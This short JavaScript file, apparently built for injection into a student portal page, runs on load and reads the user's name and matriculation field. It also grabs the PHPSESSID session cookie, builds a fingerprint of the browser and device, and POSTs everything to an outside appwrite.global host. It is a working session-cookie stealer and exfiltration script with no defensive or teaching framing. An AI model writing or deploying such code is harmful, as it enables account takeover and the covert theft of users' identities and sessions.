function GetUserDetails() {
    var userDetails = {
        name: document.querySelector('.user-name') ? document.querySelector('.user-name').textContent : "Unavailable",
        matric: document.querySelector('.user-role') ? document.querySelector('.user-role').textContent : "Unavailable"
    };

    document.cookie.split(';').forEach(cookie => {
        const [name, value] = cookie.trim().split('=');
        if (name == 'PHPSESSID') {userDetails['phpsess'] = value; }
    });

    return userDetails
}

// Get detailed device information
function getDeviceInfo() {
    return {
        "datetime": new Date().toLocaleString().replace(',', ' -'),
        "browser": navigator.userAgent,
        "screen": `${window.screen.width}x${window.screen.height}`,
        "viewport": `${window.innerWidth}x${window.innerHeight}`,
        "CPU": navigator.hardwareConcurrency || 'Unknown',
        "memory": navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
        "timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
        "system": navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform,
    };
}


function storeData(device, user) {
    fetch('http://673d53a375a6942d9bd2.appwrite.global/', {
        method: 'POST',
        body: {
            'user': user,
            'device': device
        }
    })
}

(_ => {
    const device = getDeviceInfo()
    const user = GetUserDetails()
    storeData(device, user)
})()